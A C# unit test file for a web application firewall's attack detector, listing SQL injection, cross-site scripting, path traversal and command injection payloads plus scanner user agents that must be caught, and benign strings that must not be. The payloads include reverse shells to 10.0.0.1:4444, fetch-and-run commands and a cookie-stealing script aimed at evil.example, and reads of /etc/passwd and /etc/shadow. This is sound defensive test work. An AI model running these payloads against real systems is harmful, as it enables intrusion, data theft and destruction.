using FASoft.Waf.Core.Configuration;
using FASoft.Waf.Engine.Detection;

namespace FASoft.Waf.UnitTests.Detection;

/// <summary>
/// Known attack payloads (including encoded and obfuscated variants) must be detected; ordinary values
/// that look a bit like attacks must not.
/// </summary>
public class AttackCorpusTests
{
    private static readonly AttackDetector Detector = new(new AttackDetectionSettings());

    private static AttackFinding? InspectQueryValue(string raw) =>
        Detector.InspectValue(raw, RequestLocation.QueryString, "q", plusIsSpace: true);

    public static TheoryData<string> SqlInjection =>
    [
        "' OR '1'='1",
        "' or 1=1--",
        "admin'--",
        "admin' #",
        "1' OR '1'='1' /*",
        "1 OR 1=1",
        "1 AND 1=1",
        "1' || '1'='1",
        "\" or \"\"=\"",
        "1') OR ('1'='1",
        "1' UNION SELECT username, password FROM users--",
        "1 UNION ALL SELECT NULL,NULL,NULL--",
        "-1+UNION+SELECT+1,2,3",
        "1 UnIoN SeLeCt 1",
        "1'/**/UNION/**/SELECT/**/password/**/FROM/**/users",
        "1%27%20OR%20%271%27%3D%271",
        "1%2527%2520OR%25201%253D1",
        "1; DROP TABLE users--",
        "1'; EXEC xp_cmdshell('dir')--",
        "1' AND SLEEP(5)--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
        "' AND 1=CONVERT(int,@@version)--",
        "CHAR(97,100,109,105,110)",
        "１' ＯＲ '１'='１",
    ];

    public static TheoryData<string> CrossSiteScripting =>
    [
        "<script>alert(1)</script>",
        "<ScRiPt>alert(document.cookie)</sCrIpT>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "%253Cscript%253Ealert(1)",
        "%u003Cscript%u003Ealert(1)",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#x3C;script&#x3E;alert(1)",
        "＜script＞alert(1)＜/script＞",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "\" onmouseover=\"alert(1)",
        "' autofocus onfocus='alert(1)",
        "<iframe src=\"https://evil.example\"></iframe>",
        "javascript:alert(document.domain)",
        "JaVaScRiPt:alert(1)",
        "java&#x09;script:alert(1)",
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
        "<a href=\"data:text/html,<b>x</b>\">",
        "eval(atob('YWxlcnQoMSk='))",
        "\"><svg onload=fetch('//evil.example/'+document.cookie)>",
    ];

    public static TheoryData<string> PathTraversal =>
    [
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "..\\..\\windows\\win.ini",
        "....//....//etc/passwd",
        "/var/www/../../etc/shadow",
        "file:///etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "image.php%00.jpg",
        "/.git/config",
        "/.env",
        "..;/admin",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/proc/self/environ",
    ];

    public static TheoryData<string> CommandInjection =>
    [
        "; cat /etc/passwd",
        "| whoami",
        "&& id",
        "`id`",
        "$(whoami)",
        "; ls -la",
        "|| ping -c 10 127.0.0.1",
        "127.0.0.1; wget http://evil.example/x.sh",
        "%3Bcat%20%2Fetc%2Fpasswd",
        "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "cmd.exe /c dir",
        "powershell -enc SQBFAFgA",
        "a;cat${IFS}/etc/passwd",
        "| nc -e /bin/sh 10.0.0.1 4444",
        "; curl evil.example/x | sh",
    ];

    public static TheoryData<string> AttackUserAgents =>
    [
        "sqlmap/1.7.2#stable (https://sqlmap.org)",
        "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000001)",
        "Mozilla/5.0 zgrab/0.x",
        "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
        "WPScan v3.8.22 (https://wpscan.com/wordpress-security-scanner)",
        "gobuster/3.6",
        "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
    ];

    /// <summary>Ordinary values: text, punctuation, URLs, tokens and HTML without active content.</summary>
    public static TheoryData<string> BenignValues =>
    [
        "O'Brien", "Rock 'n' Roll", "It's fine, isn't it?", "Don't stop; believe",
        "select a size", "Select one from the list below", "union of european states", "the trade union selected a leader",
        "Tom & Jerry", "rock & roll", "cat & dog", "1+1=2", "price>=100", "a < b and c > d", "I <3 cats", "x = y or z",
        "what is 1 or 2", "john.doe@example.com", "https://example.com/path?x=1&y=2", "C# vs. C++", "100% cotton", "50%off",
        "café crème", "日本語のテキスト", "2024-11-22T10:00:00Z", "550e8400-e29b-41d4-a716-446655440000",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
        "drop me a line", "update your profile", "please delete from cart", "Hello; how are you", "the end; the beginning",
        "echo of the past", "ping pong", "sleep well", "benchmark results", "wait for delay", "concat strings",
        "script writer", "javascript tutorial", "javascript: the good parts", "description of the onload event", "on error resume next",
        "<b>bold</b>", "<p>Hello <em>world</em></p>", "<a href=\"https://example.com\">link</a>",
        "a.b.c", "version 1.2.3", "file.tar.gz", "hello...world", "Q&A: what's new?", "#hashtag", "--verbose", "-- signed, Frank",
        "SELECT is a SQL keyword", "id", "ls", "net income", "shell company", "Bash (Unix shell)",
        "sort=name;asc", "x||y", "a|b|c", "The `code` sample",
    ];

    public static TheoryData<string> BenignPaths =>
    [
        "/", "/api/v1/users/42", "/search", "/wp-content/uploads/2024/11/img.png", "/a/b.c/d", "/.well-known/acme-challenge/abc123",
        "/blog/2024/11/hello-world", "/files/report.final.pdf", "/products/union-jack-flag", "/docs/select-statement",
        "/cats-and-dogs", "/en-us/etc", "/static/js/app.min.js",
    ];

    public static TheoryData<string> BenignUserAgents =>
    [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "curl/8.4.0", "Wget/1.21.4", "python-requests/2.31.0", "PostmanRuntime/7.42.0", "okhttp/4.12.0",
    ];

    [Theory]
    [MemberData(nameof(SqlInjection))]
    public void Sql_injection_is_detected(string payload) => AssertDetected(payload, AttackCategory.SqlInjection);

    [Theory]
    [MemberData(nameof(CrossSiteScripting))]
    public void Cross_site_scripting_is_detected(string payload) => AssertDetected(payload, AttackCategory.CrossSiteScripting);

    [Theory]
    [MemberData(nameof(PathTraversal))]
    public void Path_traversal_is_detected(string payload) => AssertDetected(payload, AttackCategory.PathTraversal);

    [Theory]
    [MemberData(nameof(CommandInjection))]
    public void Command_injection_is_detected(string payload) => AssertDetected(payload, AttackCategory.CommandInjection);

    [Theory]
    [MemberData(nameof(AttackUserAgents))]
    public void Attack_tool_user_agents_are_detected(string userAgent)
    {
        var finding = Detector.InspectValue(userAgent, RequestLocation.Header, "User-Agent", [AttackCategory.BadUserAgent]);

        Assert.NotNull(finding);
        Assert.Equal(AttackCategory.BadUserAgent, finding.Category);
    }

    [Theory]
    [MemberData(nameof(BenignValues))]
    public void Ordinary_values_are_not_flagged(string value)
    {
        var finding = InspectQueryValue(value);

        Assert.True(finding is null, $"False positive: {finding}");
    }

    [Theory]
    [MemberData(nameof(BenignPaths))]
    public void Ordinary_paths_are_not_flagged(string path)
    {
        var finding = Detector.InspectValue(path, RequestLocation.Path);

        Assert.True(finding is null, $"False positive: {finding}");
    }

    [Theory]
    [MemberData(nameof(BenignUserAgents))]
    public void Ordinary_user_agents_are_not_flagged(string userAgent)
    {
        var finding = Detector.InspectValue(userAgent, RequestLocation.Header, "User-Agent");

        Assert.True(finding is null, $"False positive: {finding}");
    }

    /// <summary>
    /// The payload must be caught by the detector of its own category (checked in isolation: e.g. "; cat
    /// /etc/passwd" is also, and first, a path-traversal hit, but command injection must catch it too).
    /// </summary>
    private static void AssertDetected(string payload, AttackCategory expected)
    {
        Assert.NotNull(InspectQueryValue(payload));

        var finding = Detector.InspectValue(payload, RequestLocation.QueryString, "q", [expected], plusIsSpace: true);
        Assert.True(finding is not null, $"Not detected as {expected}: {payload}");
    }
}
